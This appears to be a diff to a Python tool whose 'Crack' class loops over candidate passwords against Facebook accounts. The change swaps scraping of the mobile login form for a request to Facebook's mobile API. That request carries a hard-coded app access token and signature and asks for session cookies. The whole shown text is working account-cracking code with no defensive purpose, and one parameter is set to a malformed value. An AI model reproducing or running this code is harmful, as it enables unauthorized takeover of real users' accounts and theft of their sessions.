@@ -455,15 +455,18 @@ class Crack:
 			for pw in pwx:
 				pw = pw.lower()
 				ua = random.choice(ugent)
-				r = ses.get("https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&ref=dbl&fl&login_from_aymh=1&refid=9")
 				params = {
-				 'lsd': re.search('name="lsd" value="(.*?)"',str(r.text)).group(1), 
-                 'jazoest': re.search('name="jazoest" value="(.*?)"',str(r.text)).group(1),
-                 'm_ts': re.search('name="m_ts" value="(.*?)"',str(r.text)).group(1), 
-                 'li': re.search('name="li" value="(.*?)"',str(r.text)).group(1), 
-                 'try_number': '0', 'unrecognized_tries': '0', 'email': email, 'masked_cp': '', 'pass': pw,'login': 'Masuk', 'bi_xrwh': '0'}
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": email,
+					"locale": "en_US",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+				}
 				headers = {
-                "Host": "m.facebook.com",
+					"Host": "m.facebook.com",
                 "cache-control": "max-age=0",
                 "upgrade-insecure-requests": '"1"',
                 "origin": "https://m.facebook.com",
